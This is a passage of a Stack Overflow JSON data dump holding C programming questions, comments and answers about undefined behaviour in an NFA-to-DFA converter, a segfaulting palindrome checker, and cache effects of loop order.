"https://lh4.googleusercontent.com/-LFn4e8gQrDs/AAAAAAAAAAI/AAAAAAAAAGQ/dEioCWMAAns/photo.jpg?sz=128", "display_name": "Bil", "link": "https://stackoverflow.com/users/4331563/bil"}, "reply_to_user": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "edited": false, "score": 0, "creation_date": 1449702780, "post_id": 34190250, "comment_id": 56127989, "body": "only two warnings not related with this prblm !  F:\\backup.c||In function &#39;epClosure&#39;:| F:\\backup.c|220|warning: function returns address of local variable [-Wreturn-local-addr]| F:\\backup.c||In function &#39;makeDFAstate&#39;:| F:\\backup.c|257|warning: function returns address of local variable [-Wreturn-local-addr]| ||=== Build finished: 0 error(s), 2 warning(s) (0 minute(s), 0 second(s)) ===|"}, {"owner": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "edited": false, "score": 0, "creation_date": 1449702824, "post_id": 34190250, "comment_id": 56128006, "body": "How do you know they aren&#39;t related? They are undefined behavior that could cause anything to happen."}, {"owner": {"reputation": 35, "user_id": 4331563, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-LFn4e8gQrDs/AAAAAAAAAAI/AAAAAAAAAGQ/dEioCWMAAns/photo.jpg?sz=128", "display_name": "Bil", "link": "https://stackoverflow.com/users/4331563/bil"}, "reply_to_user": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "edited": false, "score": 0, "creation_date": 1449703365, "post_id": 34190250, "comment_id": 56128209, "body": "Hmm  i see , but in my mind there is something that says the printf or puts function clears some area in the memory or a processor&#39;s register , that&#39;s why the result is correct when its used . don&#39;t you think it&#39;s bizarre in a way ?"}, {"owner": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "edited": false, "score": 0, "creation_date": 1449703693, "post_id": 34190250, "comment_id": 56128326, "body": "They are buffered if that&#39;s what you mean. But printing nothing (even correctly) does not flush the buffers. Undefined behavior is undefined behavior. You can&#39;t rely on it doing what you want."}, {"owner": {"reputation": 35, "user_id": 4331563, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-LFn4e8gQrDs/AAAAAAAAAAI/AAAAAAAAAGQ/dEioCWMAAns/photo.jpg?sz=128", "display_name": "Bil", "link": "https://stackoverflow.com/users/4331563/bil"}, "reply_to_user": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "edited": false, "score": 0, "creation_date": 1449704199, "post_id": 34190250, "comment_id": 56128524, "body": "thanx man appreciate it . however this code is not my final work  i&#39;ve the final version done , with all your points taken care of already, i just wanted to discuss  this problem &amp; what are its causes , cheers."}], "answers": [{"comments": [{"owner": {"reputation": 35, "user_id": 4331563, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-LFn4e8gQrDs/AAAAAAAAAAI/AAAAAAAAAGQ/dEioCWMAAns/photo.jpg?sz=128", "display_name": "Bil", "link": "https://stackoverflow.com/users/4331563/bil"}, "edited": false, "score": 0, "creation_date": 1449701575, "post_id": 34190397, "comment_id": 56127465, "body": "that&#39;s the point . remove the hole instruction then u can see the result !!"}, {"owner": {"reputation": 29374, "user_id": 534124, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/ff98b534423075fdc17adc353ebdbb88?s=128&d=identicon&r=PG", "display_name": "Oswald", "link": "https://stackoverflow.com/users/534124/oswald"}, "reply_to_user": {"reputation": 35, "user_id": 4331563, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-LFn4e8gQrDs/AAAAAAAAAAI/AAAAAAAAAGQ/dEioCWMAAns/photo.jpg?sz=128", "display_name": "Bil", "link": "https://stackoverflow.com/users/4331563/bil"}, "edited": false, "score": 0, "creation_date": 1449702961, "post_id": 34190397, "comment_id": 56128070, "body": "I did remove the instruction and I saw a result (and some warnings about returning a pointer to a local variable). but seeing the result was pure luck due two the other cases of undefined behavior."}, {"owner": {"reputation": 35, "user_id": 4331563, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-LFn4e8gQrDs/AAAAAAAAAAI/AAAAAAAAAGQ/dEioCWMAAns/photo.jpg?sz=128", "display_name": "Bil", "link": "https://stackoverflow.com/users/4331563/bil"}, "edited": false, "score": 0, "creation_date": 1449704337, "post_id": 34190397, "comment_id": 56128575, "body": "Thank you sir , appreciate it :D"}], "tags": [], "owner": {"reputation": 29374, "user_id": 534124, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/ff98b534423075fdc17adc353ebdbb88?s=128&d=identicon&r=PG", "display_name": "Oswald", "link": "https://stackoverflow.com/users/534124/oswald"}, "is_accepted": false, "score": 0, "last_activity_date": 1449700972, "creation_date": 1449700972, "answer_id": 34190397, "question_id": 34190250, "link": "https://stackoverflow.com/questions/34190250/can-you-explain-this-challenge/34190397#34190397", "title": "Can you explain this , challenge?", "body": "<p><code>puts(mm)</code> yields undefined behavior, because <code>mm</code> does not point to a string.</p>\n"}, {"tags": [], "owner": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "is_accepted": false, "score": 1, "last_activity_date": 1449703020, "creation_date": 1449703020, "answer_id": 34190861, "question_id": 34190250, "link": "https://stackoverflow.com/questions/34190250/can-you-explain-this-challenge/34190861#34190861", "title": "Can you explain this , challenge?", "body": "<p>You have 2 functions <code>epClosure</code> and <code>makeDFAstate</code> that return addresses to local variables. This is undefined behavior and a likely cause to your problem.</p>\n\n<p>To fix it either dynamically allocate memory (using <code>malloc</code>) for the variables or take an address to write to as an argument e.g. <code>void epClosure(char stat, char* buf)</code>. You'd probably want to also pass the size of the buffer to make sure you don't write past it.</p>\n"}], "owner": {"reputation": 35, "user_id": 4331563, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-LFn4e8gQrDs/AAAAAAAAAAI/AAAAAAAAAGQ/dEioCWMAAns/photo.jpg?sz=128", "display_name": "Bil", "link": "https://stackoverflow.com/users/4331563/bil"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 80, "favorite_count": 0, "answer_count": 2, "score": -6, "last_activity_date": 1449703020, "creation_date": 1449700220, "last_edit_date": 1449702092, "question_id": 34190250, "link": "https://stackoverflow.com/questions/34190250/can-you-explain-this-challenge", "title": "Can you explain this , challenge?", "body": "<p>well let's see , i have this code of converting NFA automate to DFA ;which is written by me ; and i discovered let's say a \"bug\" ;</p>\n\n<p><br>the printf() instruction </p>\n\n<h2>which is meant to be like this \" printf(\"\",X); \"  to prevent the bug</h2>\n\n<p>has no characters to print on the screen , you can use any argument you want ; even if it has no value .</p>\n\n<p>the <strong>problem</strong> is when you remove one of these instructions the result turns upside down ( mingled displaying )</p>\n\n<h2>challenge is : explain this bug with details !</h2>\n\n<p>the bug is in the NFAtoDFA() func line 69 &amp; 75</p>\n\n<p>here's the  code :</p>\n\n<pre><code>    #include &lt;stdio.h&gt;\n    #include &lt;string.h&gt;\n    #define max   50 //maximum number of symbols and states\n    #define true  1\n    #define false 0\n    #define epsilon '~'\n\n    char states [max]={'0','1','2','3','4','5','6','7','8','9','W'};\n    char initState='0';\n    char symbols[max]={epsilon,'a','b'};\n    char finalStates[max]={'W'};\n    char newSymbols[max]={'a','b'};\n    char newStates[max][max];\n\n    int nbrSymbols=3,nbrStates=11,nbrNewStates=0,nbrNewSymbols=0,nfaMaxLength=2,dfaMaxLength=0;\n\n    char NFA [max] [max] [max];\n    char DFA [max] [max] [max];\n    int mm ;\n\n\n    /** NDAtoDFA of the NFA */\n    void NDAtoDFA();\n        char *makeDFAstate  (char state[],int c);\n            char *epClosure     (char stat);\n            char *nextStates    (char sta,char symb);\n            void  add_no_rpt    (char ss[],char aa[]);\n            int   getCharIndex  (char str[],char c);\n            int   accepted      (char str[],char toAccept[]) ;\n        int   findDfaState  (char str[]);\n    /*******************************/\n\n    /** flag = 0 | 1         */\n    /** keep ( 0 | 1 ) occurrences of char c in a string  */\n    void del(char str[],char c,int flag);\n    /******************************/\n\n\n    /** printing Automates */\n    void shift(int b,int a);\n    void showNFA();\n    void showDFA();\n    int isFinalState(char state[]);\n    /******************************/\n\n\n\n    int main()\n    {\n        strcpy( NFA[0][0],\"17\");strcpy( NFA[1][0],\"24\");strcpy( NFA[2][1],\"3\");strcpy( NFA[3][0],\"6\");\n        strcpy( NFA[4][2],\"5\");strcpy( NFA[5][0],\"6\");strcpy( NFA[6][0],\"17\");strcpy( NFA[7][1],\"8\");\n        strcpy( NFA[8][2],\"9\");strcpy( NFA[9][2],\"W\");\n        NDAtoDFA();\n    }\n\n    /******************************************************/\n\n    /******************************************************/\n\n    void NDAtoDFA()\n    {\n        int i,j;  char zz[max];\n        strcpy(newSymbols,symbols);  del(newSymbols,epsilon,0);\n\n        nbrNewSymbols=strlen(newSymbols);\n        /** making the first state*/\n        strcpy(newStates[nbrNewStates++], epClosure(initState) );\n        /**                       */\n                printf(\"\",mm); /** &lt;=== */\n        for(i=0;i&lt;nbrNewStates;i++)\n        {\n            for(j=0;j&lt;nbrNewSymbols;j++)\n            {\n                strcpy(DFA[i][j],makeDFAstate(newStates[i],j));\n                printf(\"\",mm); /** &lt;=== */\n                if(findDfaState(DFA[i][j])==false) {strcpy(newStates[nbrNewStates++],DFA[i][j]);\n                if(strlen(DFA[i][j])&gt;dfaMaxLength) dfaMaxLength=strlen(DFA[i][j]);//for printing DFA\n                }\n            }\n        }\n        showNFA();\n        printf(\"\\n      \");shift(dfaMaxLength,0);  printf(\"[][][]\");\n        printf(\"\\n      \");shift(dfaMaxLength,0);  printf(\"||  ||\");\n        printf(\"\\n      \");shift(dfaMaxLength,0);  printf(\"||  ||\");\n        printf(\"\\n      \");shift(dfaMaxLength,0);  printf(\"||  ||\");\n        printf(\"\\n      \");shift(dfaMaxLength,0);  printf(\"||  ||\");\n        printf(\"\\n      \");shift(dfaMaxLength,2);printf(\"[][]  [][]\");\n        printf(\"\\n      \");shift(dfaMaxLength,2);printf(\" \\\\\\\\    //\");\n        printf(\"\\n      \");shift(dfaMaxLength,2);printf(\"  \\\\\\\\  // \");\n        printf(\"\\n      \");shift(dfaMaxLength,2);printf(\"   \\\\\\\\// \");\n        printf(\"\\n      \");shift(dfaMaxLength,2);printf(\"    \\\\/ \");\n        showDFA();\n\n    }\n    /******************************************************/\n\n    /******************************************************/\n\n    void add_no_rpt(char ss[],char aa[])\n    {int i,j;char tt[1];\n        for (i=0;aa[i]!=0;i++) if(getCharIndex(ss,aa[i])==-1) {tt[0]=aa[i];tt[1]=0;strcat(ss,tt);}\n    }\n    /******************************************************/\n\n    /******************************************************/\n\n    void del(char str[],char c,int flag)\n    {\n        char * p,*barrier;\n        barrier=p=strchr(str,c);\n        if (flag==1)\n            {\n                barrier=p+1; //set the barrier after the first occurrence of c\n                p=strchr(barrier,c);\n            }\n        while (p!=NULL)\n         {\n            for (;*p!='\\0';p++) *p=*(p+1);\n            p=strchr(barrier,c);\n         }\n    }\n\n    /******************************************************/\n\n    /******************************************************/\n\n    char* nextStates (char sta,char symb)\n    {   int i,j;\n        for(i=0;i&lt;nbrStates ;i++) if(sta ==states [i]) break;\n        for(j=0;j&lt;nbrSymbols;j++) if(symb==symbols[j]) break;\n        return NFA[i][j];\n    }\n    /******************************************************/\n\n    /******************************************************/\n\n    int accepted (char str[],char toAccept[])\n    {   int i;\n        for (i = 0 ; toAccept[i]!=0; i++)\n    {\n        if(toAccept[i]==' ') {del(toAccept,toAccept[i],0);if(i!=0) i--;}\n        if(getCharIndex(symbols,toAccept[i])!=-1 || getCharIndex(str,toAccept[i])==-1)  {return false;}\n    }\n    return true;\n    }\n    /******************************************************/\n\n    /******************************************************/\n\n    int getCharIndex(char str[],char c)\n    {\n        int i;\n        for (i = 0 ; str[i]!=0; i++) if(str[i]==c) return i;\n        return -1;\n    }\n\n    /******************************************************/\n\n    /******************************************************/\n    void showNFA()\n    {int i,j;\n                printf(\"\\nSYMBOLS: %s\\n\",symbols);\n                printf(\"STATES : %s\\n\",states);\n                printf(\"FINAL STATES : %s\\n\\n\",finalStates);\n                puts(\"STATE TRANS.\");\n                printf(\"\\n      \");shift(dfaMaxLength+2,4);printf(\"NFA | \");\n                for (i = 0; i &lt; nbrSymbols; i++) {printf(\"  %c\", symbols[i]);shift(nfaMaxLength+1,0);}\n                printf(\"\\n \");shift(dfaMaxLength+2,0);printf(\"--------\");\n                for (i = 0; i &lt; nbrSymbols; i++) for(j=0;j&lt;nfaMaxLength+3;j++) printf(\"-\"); printf(\"\\n\");\n                for (i = 0; i &lt; nbrStates; i++) {\n                    shift(dfaMaxLength+3,0);\n                    printf(\"  %c  | \",states[i]);\n                    for (j = 0; j &lt; nbrSymbols; j++)\n                    {\n                    if(strcmp(NFA[i][j],\"\")==0) {printf(\"  -\");shift(nfaMaxLength+1,strlen(NFA[i][j]));}\n                    else {printf(\"  %s\",NFA[i][j]);shift(nfaMaxLength+2,strlen(NFA[i][j]));}\n                    }\n                    printf(\"\\n\");\n                    }\n\n    }\n    /******************************************************/\n\n    /******************************************************/\n\n    void shift(int b,int a)\n    {int i;\n        for (i = 0; i &lt; (b-a); i++)printf(\" \");\n    }\n    /******************************************************/\n\n    /******************************************************/\n    void showDFA()\n    {int i,j;\n                printf(\"\\n\\n      \");shift(dfaMaxLength,5);printf(\"DFA    |\");shift(5,0);\n                for (i = 0; i &lt; nbrNewSymbols; i++) {printf(\"%c\", newSymbols[i]);shift(dfaMaxLength+5,0);}\n                printf(\"\\n     \");for(j=0;j&lt;dfaMaxLength+6;j++)printf(\"-\");\n                for (i = 0; i &lt; nbrNewSymbols; i++)for(j=0;j&lt;dfaMaxLength+4;j++)printf(\"-\"); printf(\"\\n\");\n                for (i = 0; i&lt;nbrNewStates; i++) {\n                    if (isFinalState(newStates[i])==true)\n                        if (i==0) printf(\" &lt;-&gt; \");\n                        else printf(\" &lt;-- \");\n                    else\n                        if (i==0) printf(\" --&gt; \");\n                        else printf(\"     \");\n                        printf(\"{%s}\",newStates[i]);shift(dfaMaxLength,strlen(newStates[i]));printf(\" |\");\n                    for (j = 0; j &lt; nbrNewSymbols; j++)\n                        printf(\"  {%s}  \",DFA[i][j]);\n                         printf(\"\\n\");\n                    }\n    }\n    /******************************************************/\n\n    /******************************************************/\n\n    char*epClosure(char stat)\n    {   int i,j;char zz[max];\n        zz[0] = stat;  zz[1]=0;\n        for (i=0;zz[i]!=0;i++) add_no_rpt(zz,nextStates(zz[i],epsilon));\n        return zz;\n    }\n    /******************************************************/\n\n    /******************************************************/\n    int findDfaState(char str[])\n    {\n        int i;\n        for(i=0;i&lt;nbrNewStates;i++)\n        {\n            if (accepted(newStates[i],str)==true &amp;&amp; strlen(str)==strlen(newStates[i])) return true;\n        }\n        return false;\n    }\n    /******************************************************/\n\n    /******************************************************/\n\n    int isFinalState(char state[])\n    {\n        int i;\n        for(i=0;state[i]!=0;i++) if (strchr(finalStates,state[i])!=NULL) return true;\n         return false;\n    }\n    /******************************************************/\n\n    /******************************************************/\n\n    char *makeDFAstate(char state[],int c)\n    {\n         int i,j;char kk[max],yy[max];\n         for (i=0;state[i]!=0;i++)\n         {\n             add_no_rpt(kk,nextStates(state[i],newSymbols[c]));\n             j=strlen(kk)-1;\n             add_no_rpt(kk,epClosure(kk[j]));\n         }\n         return kk;\n    }\n</code></pre>\n\n<p>have fun !</p>\n"}, {"tags": ["c", "arrays", "string", "getchar"], "comments": [{"owner": {"reputation": 801, "user_id": 2106576, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cRsRm.jpg?s=128&g=1", "display_name": "Kishore", "link": "https://stackoverflow.com/users/2106576/kishore"}, "edited": false, "score": 0, "creation_date": 1449699616, "post_id": 34190010, "comment_id": 56126561, "body": "The problem is in the <code>isPalindrome()</code> function. Carefully check the indices in the loops under that function."}, {"owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 0, "creation_date": 1449699743, "post_id": 34190010, "comment_id": 56126614, "body": "In addition to the other comments, the s char array is not initialized.  So, its likely not null terminated, and the printf in the do-while loop will be an issue.  Do a memset on s to zero, and it should be better."}, {"owner": {"reputation": 25937, "user_id": 338904, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/dea29233fa03ea84f8a853102deb0344?s=128&d=identicon&r=PG", "display_name": "e2-e4", "link": "https://stackoverflow.com/users/338904/e2-e4"}, "edited": false, "score": 0, "creation_date": 1449704764, "post_id": 34190010, "comment_id": 56128722, "body": "Is it really segmentation &quot;failed&quot;?"}, {"owner": {"reputation": 13, "user_id": 4856587, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/999f76633e86d5254c56be504090c2fb?s=128&d=identicon&r=PG&f=1", "display_name": "life_of_pi", "link": "https://stackoverflow.com/users/4856587/life-of-pi"}, "edited": false, "score": 0, "creation_date": 1449708279, "post_id": 34190010, "comment_id": 56129935, "body": "Yes, but it`s solved , i wrote this: c=getchar(); while(c!=&#39;\\n&#39;){ s[i]=c; i++; cnt++; c=getchar(); } plus corrected that comical i++, that I wrote by mistake"}], "answers": [{"comments": [{"owner": {"reputation": 7817, "user_id": 4789373, "user_type": "registered", "accept_rate": 86, "profile_image": "https://lh6.googleusercontent.com/-f_OQrxbHhFQ/AAAAAAAAAAI/AAAAAAAAABA/NY38t7ooQ5c/photo.jpg?sz=128", "display_name": "FalconUA", "link": "https://stackoverflow.com/users/4789373/falconua"}, "edited": false, "score": 1, "creation_date": 1449699726, "post_id": 34190071, "comment_id": 56126606, "body": "also, in the <code>printf</code> function, I think he means the symbol <code>\\n</code>, not <code>n</code>. (actually that&#39;s why the do-while loop not worked)"}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "reply_to_user": {"reputation": 7817, "user_id": 4789373, "user_type": "registered", "accept_rate": 86, "profile_image": "https://lh6.googleusercontent.com/-f_OQrxbHhFQ/AAAAAAAAAAI/AAAAAAAAABA/NY38t7ooQ5c/photo.jpg?sz=128", "display_name": "FalconUA", "link": "https://stackoverflow.com/users/4789373/falconua"}, "edited": false, "score": 0, "creation_date": 1449700090, "post_id": 34190071, "comment_id": 56126788, "body": "@FalconUA Where is there n you are speaking about?"}], "tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": true, "score": 1, "last_activity_date": 1449701225, "last_edit_date": 1449701225, "creation_date": 1449699508, "answer_id": 34190071, "question_id": 34190010, "link": "https://stackoverflow.com/questions/34190010/segmentation-failed-core-dumped-c/34190071#34190071", "title": "Segmentation failed (core dumped), C", "body": "<p>There is a typo in this loop</p>\n\n<pre><code>int j=0;\nfor(i=cnt-1; i&gt;=0; i++){\n                   ^^^^\npal[j]=c[i];\nj++;\n}\n</code></pre>\n\n<p>I think you mean <code>i--</code></p>\n\n<p>Also you did not assign the terminatinbg zero to array <code>s</code>  So using for example\nthis statement</p>\n\n<pre><code>printf(\"\\n%s\\n\",s);\n</code></pre>\n\n<p>in this do-while loop </p>\n\n<pre><code>do{\nc=getchar();\ns[i]=c;\ni++;\ncnt++;\nprintf(\"\\n%s\\n\",s);\n}while(c!='\\n');\n</code></pre>\n\n<p>is wrong.</p>\n\n<p>Besides you included the new line character in the array s.</p>\n\n<p>Take into account that the function can be written simpler without using an auxiliary array. For example</p>\n\n<pre><code>bool isPalyndrom( const char s[], size_t n ) \n{\n    size_t i = 0;\n\n    while ( i &lt; n / 2 &amp;&amp; s[i] == s[n-i-1] ) ++i;\n\n    return i == n / 2;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 39660, "user_id": 3880585, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/8pfp3.png?s=128&g=1", "display_name": "gaetanoM", "link": "https://stackoverflow.com/users/3880585/gaetanom"}, "is_accepted": false, "score": 0, "last_activity_date": 1449700350, "creation_date": 1449700350, "answer_id": 34190282, "question_id": 34190010, "link": "https://stackoverflow.com/questions/34190010/segmentation-failed-core-dumped-c/34190282#34190282", "title": "Segmentation failed (core dumped), C", "body": "<p>There are some mistakes it's clear. In any case the solution could be:</p>\n\n<pre class=\"lang-js prettyprint-override\"><code>#include &lt;stdio.h&gt;\n#include&lt;stdbool.h&gt;\n\n#define MAX 100\n\nbool isPalyndrom(char c[]) {\n    int strLen = strlen(c);\n    for (int i = 0; i &lt; strLen / 2; i++){\n        if (c[i] != c[strLen - i - 1]) {\n            return false;\n        }\n    }\n    return true;\n}\n\nint main() {\n    char c, s[MAX];\n    int i = 0;\n    while ((c = getchar()) != '\\n') {\n        s[i++] = c;\n    } \n    s[i] = '\\0';\n    printf(\"%d\", strlen(s));\n    bool istrue = isPalyndrom(s);\n    if (istrue){\n        printf(\"\\n%s Pal.\\n\", s);\n    } else {\n        printf(\"\\n%s not Pal.\\n\", s);\n    }\n    return 0;\n}\n</code></pre>\n\n\n"}], "owner": {"reputation": 13, "user_id": 4856587, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/999f76633e86d5254c56be504090c2fb?s=128&d=identicon&r=PG&f=1", "display_name": "life_of_pi", "link": "https://stackoverflow.com/users/4856587/life-of-pi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 78, "favorite_count": 0, "accepted_answer_id": 34190071, "answer_count": 2, "score": -2, "last_activity_date": 1449701301, "creation_date": 1449699262, "last_edit_date": 1449701301, "question_id": 34190010, "link": "https://stackoverflow.com/questions/34190010/segmentation-failed-core-dumped-c", "title": "Segmentation failed (core dumped), C", "body": "<p>I have the following programme:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;\n\n#define MAX 100\n//a)\nbool isPalyndrom(char c[], int cnt) {\n    int i;\n    char pal[MAX];\n    int j = 0;\n    for (i = cnt - 1; i &gt;= 0; i++) {\n        pal[j] = c[i];\n        j++;\n    }\n    for (i = 0; i &lt; cnt; i++) {\n        if (c[i] != pal[i]) return false;\n    }\n    return true;\n}\n\nint main() {\n    char c, s[MAX];\n    int i = 0;\n    int cnt = 0;\n    do {\n        c = getchar();\n        s[i] = c;\n        i++;\n        cnt++;\n        printf(\"\\n%s\\n\", s);\n    } while (c != '\\n');\n    printf(\"%d\", cnt);\n    bool istrue = isPalyndrom(s, cnt);\n    if (istrue) {\n        printf(\"\\n%s Pal.\\n\", s);\n    } else {\n        printf(\"\\n%s not Pal.\\n\", s);\n    }\n    return 0;\n}\n</code></pre>\n\n<p>However, when I run it, is shown: segmentation fault, the problem is in the do-while loop, the programme stops, after my char c are written in the array and before the do-while loop is left. Could somebody take a look in the do-while loop?</p>\n"}, {"tags": ["c", "performance", "caching", "optimization"], "comments": [{"owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 0, "creation_date": 1449699005, "post_id": 34189896, "comment_id": 56126258, "body": "When you say &quot;<i>I believe the first one delivers better cache performance but why??</i>&quot;, have you profiled the code?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user5411184"}, "reply_to_user": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 0, "creation_date": 1449699337, "post_id": 34189896, "comment_id": 56126440, "body": "@iharob No i haven&#39;t, how would I go about doing that?"}, {"owner": {"reputation": 414, "user_id": 4880090, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f9731995440b63d4cbf69257df481c87?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Kolokowsky", "link": "https://stackoverflow.com/users/4880090/steve-kolokowsky"}, "edited": false, "score": 0, "creation_date": 1449699417, "post_id": 34189896, "comment_id": 56126481, "body": "In loop 1, array b is moving slowly through memory, but a is moving in jumps of n * sizeof(a[0][0]).  In loop 2, both arrays are moving in increments of sizeof(array_element)."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1449699433, "post_id": 34189896, "comment_id": 56126490, "body": "Why do you believe the first delivers better cache performance if you have not tested and you have no reason why it might do so?  Might it be that your homework problem asserts so?  We are sometimes willing to help with homework, but I, at least, dislike HW questions in disguise."}, {"owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1449699685, "post_id": 34189896, "comment_id": 56126593, "body": "@JohnBollinger I completely agree with you, since I too thought that the <i>concern</i> was academic only. No testing, kind of proves that."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 1, "creation_date": 1449700061, "post_id": 34189896, "comment_id": 56126768, "body": "If this is an abstract, academic question, it probably belongs in cs.stackexchange.com, not SO."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5411184"}, "reply_to_user": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 0, "creation_date": 1449700680, "post_id": 34189896, "comment_id": 56127075, "body": "I have ran it through a cache simulator, just didn&#39;t understand the term &#39;profile&#39;. I was wondering if this was due to the constant access to the variable accum? This is NOT for Homework its on a practice exam, and I am studying for a final.... I am just trying to understand this a little bit better,but I get crucified for asking others opinion. Sorry to inconvenience you guys.. @iharob"}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1449701480, "post_id": 34189896, "comment_id": 56127428, "body": "It depends on the size of data, specifically the shape of <code>a</code> array. In the first one, <code>a[k][i]</code> causes very strided access pattern. This can cause cache conflicts. The worst case, when <code>a[k][0]</code> and <code>a[k+1][0]</code> maps to exactly the same cache line, the cache becomes useless."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5411184"}, "reply_to_user": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1449701787, "post_id": 34189896, "comment_id": 56127554, "body": "@user3528438 Are you saying, generally, the second loop would implement caching better?"}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": 